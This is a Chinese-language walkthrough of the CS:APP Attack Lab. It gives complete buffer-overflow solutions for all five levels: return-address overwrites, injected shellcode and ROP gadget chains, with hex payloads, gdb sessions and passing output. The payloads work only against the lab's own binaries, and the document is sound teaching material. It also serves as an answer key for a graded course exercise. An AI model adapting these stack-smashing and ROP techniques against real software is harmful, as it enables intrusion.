# AttackLab

## 基本知识

Attack lab考察的是对缓冲区溢出攻击的理解,x86_64结构以及gdb调试

解压之后可以看到五个文件

- README.txt 工具的用途介绍
- cookie.txt 作为个人学习者使用的密钥 `0x59b997fa`
- ctarget 123关攻击的对象,代码注入攻击
- rtarget 45关攻击的对象,返回值攻击
- farm.c 小工具农场,我们会在45关中利用这里的汇编字节码
- hex2raw 十六进制转字符串,由于部分字节数据是无法通过键盘输入的(比如0x00),这个工具可以将文件中的十六进制数据转为字符串然后输入

> 相关gdb调试命令和x86_64参数传递等基础知识请参阅BombLab的内容,不再赘述

**请注意!** 如果运行 `./ctarget -q` 没有进入输入环节,而是报错 Segmentation fault, 那么有可能是因为 WSL2 的问题, 我使用的是 WSL2 ubuntu2204, 会有这个问题. 换一个

## 实验报告

本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档

### Level1

test 函数较为清晰,即接收 `getbuf` 的返回值并输出

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

那么主要就是查看`getbuf` 函数,使用 `gdb ctarget` `disas getbuf` 可以看到其汇编代码

```txt
0x00000000004017a8 <+0>:     sub    $0x28,%rsp
0x00000000004017ac <+4>:     mov    %rsp,%rdi
0x00000000004017af <+7>:     callq  0x401a40 <Gets>
0x00000000004017b4 <+12>:    mov    $0x1,%eax
0x00000000004017b9 <+17>:    add    $0x28,%rsp
0x00000000004017bd <+21>:    retq
```

这里可以看出来分配了0x28大小的栈空间,也就是40字节,接着调用了Gets函数

所以目前栈中的情况如下

![20221110211517](https://raw.githubusercontent.com/learner-lu/picbed/master/20221110211517.png)

所以如果我们希望返回到 `touch1` 的位置,只需要制造缓冲区溢出覆盖返回地址即可,可以找到 `touch1` 的起始地址 `0x00000000004017c0`

```txt
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   ...
```

所以我们只需要构造一个前40个字节任意,后8字节为该地址的代码注入即可.同时注意小端存储,即低字节保存在低地址处

所以第一关的答案为

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00
```

```bash
root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw < 1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

> 注意运行时应带上`-q`参数表示不提交给服务器,同时使用管道符利用`hex2raw`工具

这里有一个小细节,touch1函数地址完整写法应该是

```txt
c0 17 40 00 00 00 00 00
```

后四字节(即高四字节的00 00 00 00)可以省略

虽然原先返回地址也是0x0040开头的,但是后面的两字节 `40 00` 并不能省略,准确来说`00`也可以省略但是`40`不能省略.

我个人推测有可能是零扩展的原因,不过阅读Gets的汇编源码并没有解决这个问题


### Level2

第二关的任务是返回到`touch2`,并且传入的参数val==cookie的值

显然跳转的过程很容易,但是如果想传入参数,即给rdi赋值那肯定是无法通过简单的栈溢出来做到,我们需要汇编的帮助

先阅读 `touch2`汇编确定传入的参数放在 `rdi`中

```txt
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
```

根据提示我们可以利用溢出将返回地址指向栈的地址,然后再栈中执行如下汇编代码即可

```x86asm
mov $0x59b997fa, %rdi # 赋值val
push $0x4017ec        # touch2 地址
ret
```

所以现在需要打断点确定rsp的值,这里就在调用 `Gets` 函数调用前打一个断点

```bash
(gdb) b *0x4017af
Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) r -q
Starting program: /root/csapp/03Attack Lab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) info r rsp
rsp            0x5561dc78       0x5561dc78
```

得到输入时栈指针的值是 `0x5561dc78`, 也就是应该使用栈溢出覆盖的返回地址

接着使用gcc得到汇编对应的字节码

```bash
gcc -c 2.s
objdump -d 2.o > 2.d
```

可以得到如下的 `2.d`

```txt
2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

由于指令的执行是低地址到高地址的,而我们输入的时候也是从低地址向高地址输入的,所以这里并不需要逆序

调用过程如下图所示

![20221110224424](https://raw.githubusercontent.com/learner-lu/picbed/master/20221110224424.png)

所以本关答案为

```txt
48 c7 c7 fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55
```

```bash
root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw < 2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

### Level3

第三关需要调用 `touch3`,同时参数是一个字符串的地址,这个字符串是我们的cookie

与上一关不同是这里需要存储一个字符串,并且将首地址放入rdi,而不是直接给rdi赋值

那么我们就应该把这个字符串存放在栈中,可以放在40个字节这个空间中也可以放在返回地址更高地址的地方

但实际上并不能放在40个字节这个空间中,因为可以通过反汇编查看到 `touch3` `hexmatch` 函数进行了多次的压栈操作

```txt
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   ...

(gdb) disas hexmatch
Dump of assembler code for function hexmatch:
   0x000000000040184c <+0>:     push   %r12
   0x000000000040184e <+2>:     push   %rbp
   0x000000000040184f <+3>:     push   %rbx
   0x0000000000401850 <+4>:     add    $0xffffffffffffff80,%rsp
   ...
```

touch3中push一次,callq一次,hexmatch中push3次. 这样就已经挤占了0x28的空间,显然即使将字符串保存在0x28位置的栈中也会由于后续的压栈操作而被覆盖,所以我们考虑将这个字符串保存到更高地址的位置

我们首先将cookie转换字符串,并且输出其ASCII的值

```c
#include <stdio.h>
#include <string.h>
int main() {
    char *str = "59b997fa";
    for (int i=0;i<strlen(str);i++) printf("%x ",str[i]);
    printf("\n");
    return 0;
}
```

不要忘记最后的字符串结尾是 `\0`,即0x00,所以cookie的字符串形式对应的十六进制如下

```bash
35 39 62 39 39 37 66 61 00
```

接下来我们需要计算这个字符串应该放到哪里,它的地址就应该是 rsp+0x28+0x8 = 0x5561dc78+0x30 = `0x5561dca8`

然后得到 `touch3` 的地址为 `0x4018fa`

所以需要修改之前的注入汇编代码

```x86asm
mov $0x5561dca8,%rdi
push $0x4018fa
ret
```

得到汇编对应的字节码

```txt
3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

整个调用过程如图所示

![20221110231552](https://raw.githubusercontent.com/learner-lu/picbed/master/20221110231552.png)

所以可以得到本关答案

```txt
48 c7 c7 a8 dc 61 55 68 fa 18
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

```bash
root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw < 3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

### Level4

前三关使用的是代码注入的方式,但现在这种方式已经不行了,因为加入了两种技术

- 栈地址随机初始化,这使得每一次运行程序得到的栈地址都不相同,所以不能像之前一样准确的定位到某一个地址开始执行代码
- 栈空间不可执行,这使得即使注入了攻击代码,当rip跳转到栈中试图执行代码时也会出现段错误导致失败

但是所谓道高一尺魔高一丈,我们可以利用返回值来进行攻击(ROP)

返回值攻击是利用了程序中已知的字节码,大多是由一两条指令跟着一个ret,举一个例子,假设有如下函数

```c
void setval_210(unsigned *p) {
    *p = 3347663060U;
}
```

看起来这个函数不知所云,其汇编代码如下

```txt
0000000000400f15 <setval_210>:
  400f15: c7 07 d4 48 89 c7         movl $0xc78948d4,(%rdi)
  400f1b: c3 retq
```

但是如果我们对照汇编字节码指令的表格,就可以发现第一行后三个字节码 `48 89 c7` 相当于指令 `mov %rax,rdi`

![20221110232817](https://raw.githubusercontent.com/learner-lu/picbed/master/20221110232817.png)

那么这就给我们提供了一种思路,通常来说一个正常函数得到的汇编指令不会在最后几行是比如 `popq %rdi` `mov %rax,rdi` 然后ret返回

正常从 `0x400f15` 调用此函数没什么意义,但是如果从 `0x400f18` 开始调用,那么这段汇编相当于

```txt
0000000000400f18 <attack method!!!>:
  400f18: 48 89 c7         movl %rax,%rdi
  400f1b: c3 retq
```

那么我们就可以利用这种漏洞来进行攻击

文件 `farm.c` 就提供了这样一组函数"农场",它们看起来不知所云,但是汇编的字节码充满着可以攻击的手段.我们的任务就是利用这些返回值来攻击

---

那回到本题,要求是再去执行 `touch2`, 也就是说我们只需要跳转到 `touch2` 的地址,并且将我们的cookie赋值给 %rdi 即可

查找汇编对应的字节码可以使用如下指令将整个程序反汇编保存到 `asm.txt` 中,然后在vim中查询

```bash
objdump -d rtarget > asm.txt
```

vim中查询高亮明显可以使用 `set hlsearch` 使选中的高亮


那么赋值操作显然是popq,最理想的就是直接将栈中保存的值`0x59b997fa` 通过 `popq %rdi` 赋值给rdi,但是找不到对应的字节码(5f)在合理的位置

但是我们可以找到 `popq rax`(0x58),后面的(0x90)是nop空指令

```txt
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

调用的地址为 `0x4019ab`

接着将rax赋值给rdi,即寻找 `48 89 c7`

```txt
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
```

调用的地址为 `0x4019a2`

最后再返回到 `touch2` 的地址 `0x4017ec` 即可

整个调用过程如下图

![20221110235850](https://raw.githubusercontent.com/learner-lu/picbed/master/20221110235850.png)

所以答案为

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

```bash
root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw  < 4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Level5

最后一关是去调用 `touch3`, 并且传入一个参数rdi是cookie的字符串的首地址

那么我们可以分析一下,这个字符串一定是保存在栈中的,也就是整个栈的最上面.那么我们需要在某一个时刻获取rsp,然后利用rsp+bias获取到起始地址,并且将这个地址赋给rdi即可

非常幸运的是我们可以在 `farm.c` 中找到这样一个函数

```c
long add_xy(long x, long y)
{
    return x+y;
}
```

其汇编如下,也就是说我们需要把rsp赋值给rdi,然后把bias赋值给rsi,这样就得到了最终的字符串首地址,把rax再赋值给rdi即可

```txt
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```

这里的bias我们现在不能确定,应该是整个流程需要的指令数量确定了之后才可以计算出来

那么整个思路其实已经比较清晰了,只需要再对着这个表格搜索需要的就可以了

> 注意使用 movl 以及后面如果是双字节的nop指令(andb/orb)也可以利用

本题答案唯一,只使用farm.c中的函数没有其他的走法,寄存器的转移是固定的,这里就不再一一分析了,直接给出本题答案

整个过程调用如下图所示

![20221111002949](https://raw.githubusercontent.com/learner-lu/picbed/master/20221111002949.png)

由此可以计算出 bias 的值应该为 `0x48`

所以本题答案为

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

```bash
root@da1811a84ddc:~/csapp/03Attack Lab/target1# ./hex2raw < 5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```
